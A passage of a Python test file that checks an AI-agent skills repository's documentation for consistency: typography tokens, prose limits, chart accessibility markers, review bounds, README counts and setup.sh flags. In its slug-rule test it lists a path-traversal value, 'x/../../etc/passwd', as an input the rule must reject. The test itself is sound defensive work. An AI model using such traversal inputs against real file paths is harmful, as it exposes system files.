    assert "2.5x-3x" in shaper_ref, (
        "ux-product-shaper reference must mirror the hero-size rule"
    )

    ds_ref = (
        SKILLS_DIR / "design-system" / "references" / "token-and-component-specs.md"
    ).read_text(encoding="utf-8")
    assert "2 primary font families" in ds_ref, (
        "design-system reference must allow 2 primary families"
    )
    assert "monospace data face" in ds_ref, (
        "design-system reference must name the monospace data face"
    )
    assert "400/600 contrast" not in ds_ref, (
        "design-system reference still carries the old weight doctrine"
    )
    assert "editorial report roles" in ds_ref or "9 editorial" in ds_ref, (
        "design-system reference must document the editorial report roles"
    )


def test_zen_prose_budget_consistency():
    """Verify every report/UI prose budget declares 2-3 sentences and <= 60 words."""
    for path in sorted(SKILLS_DIR.rglob("*.md")):
        text = path.read_text(encoding="utf-8")
        if "2-3 sentences" not in text:
            continue
        if not any(term in text.lower() for term in ("paragraph", "prose", "wording")):
            continue
        assert "<= 60 words" in text, f"{path} does not declare the 60-word cap"
        for stale in ("40-60", "45-60", "<= 3 sentences", "<= 80 words"):
            assert stale not in text, f"{path} contains stale prose budget '{stale}'"


def test_typography_contract_consistency():
    """Verify the report typography contract is centralized and internally consistent."""
    ds_skill = (SKILLS_DIR / "design-system" / "SKILL.md").read_text(encoding="utf-8")
    ds_ref = (
        SKILLS_DIR / "design-system" / "references" / "token-and-component-specs.md"
    ).read_text(encoding="utf-8")
    hr_skill = (SKILLS_DIR / "html-report" / "SKILL.md").read_text(encoding="utf-8")
    scaffold = (
        SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
    ).read_text(encoding="utf-8")

    for text, name in (
        (ds_skill, "design-system"),
        (ds_ref, "design-system reference"),
        (hr_skill, "html-report"),
    ):
        assert "60ch-70ch" in text, f"{name} does not declare the 60ch-70ch measure"
        assert "60ch-68ch" not in text, (
            f"{name} still carries the stale 60ch-68ch measure"
        )

    for minimum in ("0.9375rem", "0.75rem", "0.82rem"):
        assert minimum in hr_skill, (
            f"html-report does not declare the {minimum} minimum"
        )

    assert "font-optical-sizing" in scaffold, "Scaffold does not enable optical sizing"
    for family in (
        "Fraunces",
        "Cormorant Garamond",
        "Plus Jakarta Sans",
        "Inter",
        "JetBrains Mono",
    ):
        assert family in scaffold, f"Scaffold does not load '{family}'"

    zen_start = scaffold.index(':root[data-preset="zen-garden"] {')
    zen_block = scaffold[zen_start : scaffold.index("}", zen_start)]
    for token in (
        "--chart-ps: #9E583B",
        "--chart-prod: #5A5550",
        "--chart-old: #878079",
        "--chart-pos: #2B6648",
        "--chart-neg: #992B2B",
    ):
        assert token in zen_block, f"Zen Garden chart palette is missing '{token}'"
    assert "--chart-ps: #4A6B53" not in zen_block, (
        "Zen Garden charts must not use the moss accent"
    )
    assert "--accent: #4A6B53" in zen_block, "Zen Garden must keep moss for UI chrome"


def test_html_report_chart_interaction_contract():
    """Verify the native SVG interaction and data-label contract."""
    skill = (SKILLS_DIR / "html-report" / "SKILL.md").read_text(encoding="utf-8")
    scaffold = (
        SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
    ).read_text(encoding="utf-8")

    for marker in (
        "Chart Interaction Contract",
        "cross-highlight",
        "two decimals",
        'role="group"',
    ):
        assert marker in skill, f"html-report SKILL is missing '{marker}'"

    for marker in (
        "chart-tooltip",
        "data-chart-point",
        "data-label",
        'aria-hidden="true"',
        'pointer-events="none"',
        "prefers-reduced-motion",
    ):
        assert marker in scaffold, (
            f"Scaffold is missing chart interaction marker '{marker}'"
        )

    dv = (SKILLS_DIR / "data-visualization" / "SKILL.md").read_text(encoding="utf-8")
    assert "two decimals" in dv, (
        "data-visualization must require two-decimal percent labels"
    )
    assert "counts use `k`/`M`" in dv, (
        "data-visualization must require abbreviated counts"
    )

    a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
    assert "Chart marks are keyboard reachable" in a11y, (
        "ui-accessibility must gate chart keyboard access"
    )

    critic = (SKILLS_DIR / "ux-critic" / "SKILL.md").read_text(encoding="utf-8")
    assert "Chart interaction was checked" in critic, (
        "ux-critic must check chart interaction and labels"
    )


def test_numeric_contracts_are_canonical():
    """Numeric review bounds live in the kernel and skills point to it."""
    rules = RULES_FILE.read_text(encoding="utf-8")
    assert "diff/code review `<= 2`" in rules
    assert "spec/design review `<= 3`" in rules
    assert "hard finding `> 50`" in rules

    code_minimalism = (SKILLS_DIR / "code-minimalism" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "Follow `rules/AGENTS.md` §3" in code_minimalism
    assert "> 40 LOC" not in code_minimalism

    doubt = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "spec/design review bound in `rules/AGENTS.md` §1" in doubt
    for stale in ("three review cycles", "3 unresolved cycles", "at most three"):
        assert stale not in doubt

    spec = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(encoding="utf-8")
    assert "spec/design review bound in `rules/AGENTS.md` §1" in spec
    assert "review cycles at three" not in spec

    review_ref = (
        SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md"
    ).read_text(encoding="utf-8")
    assert "diff/code review bound in `rules/AGENTS.md` §1" in review_ref
    assert "hard length threshold in `rules/AGENTS.md` §3" in review_ref
    assert "two fix-review cycles" not in review_ref
    assert "50 effective lines" not in review_ref

    simplification = (SKILLS_DIR / "code-simplification" / "SKILL.md").read_text(
        encoding="utf-8"
    )
    assert "hard length threshold in `rules/AGENTS.md` §3" in simplification
    assert "<= 50 effective lines" not in simplification


def test_artifact_topic_slug_contract():
    """Artifact placeholders are slugged and contained by the kernel rule."""
    rules = RULES_FILE.read_text(encoding="utf-8")
    assert "^[a-z0-9]+(-[a-z0-9]+)*$" in rules
    assert "stays inside" in rules

    artifact_skills = (
        "html-report",
        "technical-reporting",
        "codebase-contracts",
        "ux-critic",
        "ui-accessibility",
        "doubt-driven-development",
        "tech-research",
        "spec-driven-design",
        "ux-product-shaper",
        "design-system",
    )
    for name in artifact_skills:
        text = (SKILLS_DIR / name / "SKILL.md").read_text(encoding="utf-8")
        assert "artifact slug and containment rule in `rules/AGENTS.md` §4" in text, (
            f"{name} does not reference the artifact slug rule"
        )

    slug = re.compile(r"^[a-z0-9]+(-[a-z0-9]+)*$")
    assert slug.fullmatch("my-report")
    for bad in ("x/../../etc/passwd", "..", "/abs", ".hidden", "Upper"):
        assert not slug.fullmatch(bad), f"slug rule accepted {bad}"


def test_deprecation_probe_uses_safe_tempdir():
    """The clone probe uses mktemp, a trap, and a validated relative target."""
    reference = (
        SKILLS_DIR
        / "deprecation-migration"
        / "references"
        / "dead-code-and-untracking-audits.md"
    ).read_text(encoding="utf-8")
    assert "mktemp -d" in reference
    assert "trap 'rm -rf -- \"$probe\"' EXIT" in reference
    assert 'case "$target" in' in reference
    assert 'rm -rf -- "$probe/$target"' in reference
    assert "/tmp/clone_probe" not in reference


def test_readme_reference_counts_match_directories():
    """Numeric README reference annotations match the files on disk."""
    readme = (REPO_DIR / "README.md").read_text(encoding="utf-8")
    expected = {
        "algorithm-optimization": 4,
        "code-minimalism": 2,
        "code-review": 3,
        "codebase-contracts": 1,
        "dashboard-design": 10,
        "deprecation-migration": 2,
        "design-system": 2,
        "doubt-driven-development": 1,
        "html-report": 2,
        "python-pro": 1,
        "python-testing": 2,
        "precommit-initialization": 4,
        "spec-driven-design": 1,
        "ui-accessibility": 1,
        "ux-critic": 1,
        "ux-product-shaper": 1,
        "verify-and-stop": 2,
        "dart-modern-idioms": 1,
        "flutter-architecture-data": 1,
        "flutter-codegen-release": 1,
        "flutter-navigation-routing": 1,
        "flutter-performance-optimization": 1,
        "flutter-state-management": 1,
        "flutter-testing-verification": 1,
        "flutter-ui-responsive-a11y": 1,
    }
    for name, count in expected.items():
        line = next(
            (
                line
                for line in readme.splitlines()
                if f"{name}/" in line and "(+" in line
            ),
            "",
        )
        match = re.search(r"\(\+ (\d+) references?", line)
        assert match, f"README is missing a numeric reference annotation for {name}"
        assert int(match.group(1)) == count, (
            f"README annotation for {name} is {match.group(1)}, expected {count}"
        )
        actual = len(
            [f for f in (SKILLS_DIR / name / "references").iterdir() if f.is_file()]
        )
        assert actual == count, f"{name} has {actual} references, expected {count}"
    assert "`AGENTS.md` §5 stub" not in readme


def test_setup_flags_and_hosts_are_documented():
    """Usage, README, and validation agree on hosts and flags."""
    setup = (REPO_DIR / "setup.sh").read_text(encoding="utf-8")
    readme = (REPO_DIR / "README.md").read_text(encoding="utf-8")
    hosts = ("portable", "antigravity", "grok", "opencode", "codex", "zed", "zcode")
    for host in hosts:
        assert host in setup, f"setup.sh does not know host {host}"
        assert host in readme, f"README does not document host {host}"
    usage = setup.split("cat <<'EOF'", 1)[1].split("\nEOF", 1)[0]
    for flag in (
        "--project",
        "--user",
        "--host",
        "--with-rust",
        "--without-rust",
        "--with-flutter",
        "--without-flutter",
        "--with-engram",
        "--without-engram",
        "--all",
        "--link",
        "--mirror-native",
        "--force",
        "--dry-run",
        "--help",
    ):
        assert flag in usage, f"setup.sh usage does not document {flag}"
    assert "eval " not in setup, "setup.sh still contains an eval helper"
    assert "maybe_remove_old_rules" not in setup, "setup.sh still contains dead helper"


def test_dispatch_contracts_include_skill_context():
    """Every Goldfish dispatch contract names the owning skill context."""
    rules = RULES_FILE.read_text(encoding="utf-8")
    assert "Task-Skill Handoff" in rules
    assert "owning review skill or persona card" in rules

    references = (
        SKILLS_DIR
        / "spec-driven-design"
        / "references"
        / "spec-templates-and-standards.md",
        SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md",
        SKILLS_DIR
        / "doubt-driven-development"
        / "references"
        / "goldfish-review-lenses.md",
    )
    for path in references:
        content = path.read_text(encoding="utf-8")
        assert "Skill context:" in content, (
            f"{path} is missing the Skill context handoff"
        )
        assert "SKILL.md" in content, f"{path} must name the SKILL.md path"


def test_rules_file_discovery_rule_present():
    """The global rules require reading AGENTS.md and writing rules only to AGENTS.md."""
    rules = RULES_FILE.read_text(encoding="utf-8")
    assert "Rules File Discovery" in rules, (
        "rules/AGENTS.md is missing the Rules File Discovery rule"
    )
    assert "Single Rules File" in rules, (
        "rules/AGENTS.md is missing the Single Rules File rule"
    )
    assert "repository rules file path" in rules, (
        "Context Economy must pass the rules file path to subagents"
    )
